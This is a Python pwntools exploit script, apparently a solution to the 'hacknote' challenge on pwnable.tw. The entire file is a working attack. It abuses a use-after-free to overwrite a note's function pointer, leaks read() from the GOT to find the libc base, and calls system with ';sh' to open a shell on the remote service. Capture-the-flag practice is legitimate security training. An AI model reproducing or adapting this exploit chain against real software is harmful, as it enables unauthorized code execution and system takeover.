from pwn import *

#r = process("./hacknote")
r = remote("chall.pwnable.tw",10102)
pause()

#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("libc_32_hacknote")

readgot = 0x804a00c
putsplt = 0x80484d0


def add(size,content):
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(str(size))
	r.recvuntil(":")
	r.sendline(content)
	r.recvuntil("Your choice :")

def delete(idx):
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(idx))
	r.recvuntil("Your choice :")

def show(idx,w=1):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(idx))

add(0x60,"A"*4) #0
add(0x60,"B"*4) #1
add(0x60,"C"*4) #2

delete(0)
delete(1)

add(8,p32(0x0804862b)+p32(readgot)) #0
show(0)

r.recvuntil("Index :")
libc_base = u32(r.recvline()[:4])-libc.symbols['read']
system = libc_base + libc.symbols["system"]
#one_shot = libc_base + 0x5f066 #0x3cbec
print "Libc base @",hex(libc_base)

delete(1)

add(9,p32(system)+";sh\x00")
show(0,w=0)
r.sendline("id")

r.interactive()
